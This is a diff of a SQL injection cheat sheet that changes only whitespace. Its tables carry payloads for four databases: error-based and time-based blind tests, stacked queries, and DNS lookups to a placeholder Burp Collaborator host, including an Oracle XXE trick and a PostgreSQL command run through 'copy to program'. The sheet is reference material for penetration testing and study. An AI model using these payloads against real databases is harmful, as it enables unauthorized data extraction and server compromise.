@@ -90,13 +90,13 @@ MySQL       SELECT * FROM information_schema.tables
 We can test a single boolean condition and trigger a database error if the condition is true.
 
 ```
-Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+Oracle      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
 
-Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+Microsoft   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
 
-PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
+PostgreSQL  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
 
-MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
+MySQL       SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
 ```
 
 ## Batched (or stacked) queries
@@ -104,11 +104,11 @@ MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.
 We can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarly of use in relation to blind vulnerabilites where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
 
 ```
-Oracle 	Does not support batched queries.
+Oracle      Does not support batched queries.
 
-Microsoft 	QUERY-1-HERE; QUERY-2-HERE
+Microsoft   QUERY-1-HERE; QUERY-2-HERE
 
-PostgreSQL 	QUERY-1-HERE; QUERY-2-HERE
+PostgreSQL  QUERY-1-HERE; QUERY-2-HERE
 
 MySQL       Does not support batched queries. 
 ```
@@ -118,13 +118,13 @@ MySQL       Does not support batched queries.
 You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
 
 ```
-Oracle 	dbms_pipe.receive_message(('a'),10)
+Oracle      dbms_pipe.receive_message(('a'),10)
 
-Microsoft 	WAITFOR DELAY '0:0:10'
+Microsoft   WAITFOR DELAY '0:0:10'
 
-PostgreSQL 	SELECT pg_sleep(10)
+PostgreSQL  SELECT pg_sleep(10)
 
-MySQL 	SELECT sleep(10)
+MySQL       SELECT sleep(10)
 
 ```
 
@@ -133,13 +133,13 @@ MySQL 	SELECT sleep(10)
 We can test a single boolean condition and trigger a time delay if the condition is true.
 
 ```
-Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+Oracle      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
 
-Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+Microsoft   IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
 
-PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+PostgreSQL  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
 
-MySQL 	SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
+MySQL       SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
 ```
 
 ## DNS lookup
@@ -147,17 +147,17 @@ MySQL 	SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
 We can cause the database to perform a DNS lookup to an external domain. To do this, we will need to user Burp Collaborator client to generate a unique Burp Collaborator subdomain that we will use in our attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
 
 ```
-Oracle 	The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+Oracle      The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
             SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote  SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
 
             The following technique works on fully patched Oracle installations, but requires elevated privileges:
             SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')
 
-Microsoft 	exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
+Microsoft   exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
 
-PostgreSQL 	copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
+PostgreSQL  copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
 
-MySQL 	    The following techniques work on Windows only:
+MySQL       The following techniques work on Windows only:
             LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
             SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
 ```
